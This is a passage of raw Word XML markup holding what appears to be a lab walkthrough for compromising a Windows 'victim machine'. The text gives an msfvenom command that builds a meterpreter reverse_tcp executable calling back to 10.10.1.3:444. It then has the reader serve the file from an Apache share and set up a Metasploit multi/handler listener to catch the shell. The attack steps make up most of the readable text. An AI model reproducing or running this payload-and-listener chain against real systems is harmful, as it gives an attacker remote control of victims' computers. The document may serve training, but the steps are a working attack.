          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Msfvenom -p windows/meterpreter/reverse_tcp - -platform windows -a x86 -f exe LHOST=10.10.1.3 LPORT 444 -o /home/swakshar/Desktop/swaksharc.exe</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000096">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000097">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64"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000099">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">The payload has been created in the specified location.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000009A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000009B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Again we need to make it available and accessible for the victim machine via web browser.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000009C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000009D">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Systemctl start apache2.service</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000009E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000009F">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42"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A1">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A2">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66"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A4">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Once it is active</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A5">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A6">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We need to transfer the payload in the /var/www/html/share folder</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A7">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A8">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Chmod -R 755 /var/www/html/share</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A9">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Chown -R www-data:www-data /var/www/html/share</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000AA">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000AB">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Cp /home/swakshar/Desktop/swaksharc.exe /var/www/html/share</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000AC">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000AD">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we need to go to msfconsole in a new tab in kali linux</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000AE">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000AF">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="71"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B1">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we need to type search exploit/multi/handler</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B2">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B3">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="45"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B5">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now type use 4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B6">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B7">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Then type set payload windows/meterpreter/reverse_tcp</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B8">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B9">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Then show options</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000BA">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000BB">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="43"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000BD">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we need to type</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000BE">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">set LHOST 10.10.1.3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000BF">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">set LPORT 444</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C0">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C1">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="2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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C3">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Then type exploit</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C4">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C5">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
